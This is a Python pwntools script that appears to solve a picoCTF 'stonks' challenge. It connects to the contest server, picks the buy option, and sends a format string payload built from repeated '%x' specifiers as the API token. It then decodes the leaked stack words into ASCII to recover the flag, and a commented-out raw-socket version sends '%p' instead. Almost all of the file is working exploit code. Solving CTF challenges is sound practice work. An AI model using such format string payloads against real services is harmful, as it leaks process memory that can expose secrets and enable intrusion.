import socket
from pwn import * # NOQA

r = remote("mercury.picoctf.net", 16439) # NOQA
r.recvuntil(b"View my portfolio\n")

r.send(b"1\n")
r.recvuntil(b"What is your API token?\n")

# Using format string attack here
r.send("%x" + "-%x"*40 + "\n")
r.recvline()

# Now we want to capture the "printf" output of user_buf
buf = r.recvline()
buf = buf[:-1].decode()
print(buf)

s = ""
for i in buf.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

print(s)


"""
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('mercury.picoctf.net', 16439))

# b'Welcome back to the trading app!\n'
welcome = clientsocket.recv(1024)
#print(welcome)

# b'\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n'
proceedOption1 = clientsocket.recv(1024)
#print(proceedOption1)
clientsocket.sendall(b"1\n")

# b'Using patented AI algorithms to buy stonks'
output1 = clientsocket.recv(1024)
print(output1)
# b'\nStonks chosen\nWhat is your API token?\n'
output2 = clientsocket.recv(1024)
#print(output2)

toSend = "%p"
toSend = toSend.encode()
clientsocket.sendall(toSend + b"\n")
# b'Buying stonks with token:'
output3 = clientsocket.recv(1024)
#print(output3)

while True:
    output = clientsocket.recv(1024)
    print(output)
    if not output:
        break
"""
